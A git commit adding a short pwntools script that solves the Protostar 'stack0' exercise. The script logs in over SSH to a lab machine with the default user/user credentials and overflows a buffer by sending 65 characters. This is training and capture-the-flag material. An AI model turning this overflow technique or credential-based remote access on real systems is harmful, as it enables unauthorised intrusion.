81bbf7b829e855d6bd17c8ac4d97a3f479b6afa5
Echpwn <48523330+Echpwn@users.noreply.github.com>
2019-03-13 16:06:26 +0100

    Update stack0.py

--- stack0.py
+++ stack0.py
@@ -1,1 +1,11 @@
+#coding:utf-8
 
+import pwn
+pwn.context(arch="i386", os="linux")
+
+remote = pwn.ssh("user", "192.168.0.10", password="user") #Bien évidement changer 192.168.0.10 par l'ip de la machine protostar
+
+exploit = remote.run("/opt/protostar/bin/stack0")
+exploit.sendline("a"*65)
+
+pwn.log.info("Success ! ")
